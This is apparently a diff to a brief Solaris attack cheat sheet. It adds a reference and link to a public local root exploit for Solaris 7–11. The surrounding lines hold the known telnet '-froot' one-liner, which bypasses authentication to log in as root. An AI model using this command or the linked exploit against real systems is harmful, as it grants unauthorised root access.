@@ -1,5 +1,8 @@
 # solaris
 
+# EXTREMEPARR local root Solaris 7 - 11 (x86 & SPARC)
+https://github.com/HackerFantastic/Public/blob/master/exploits/dtappgather-poc.sh
+
 # telnet
 telnet -l"-froot"
 
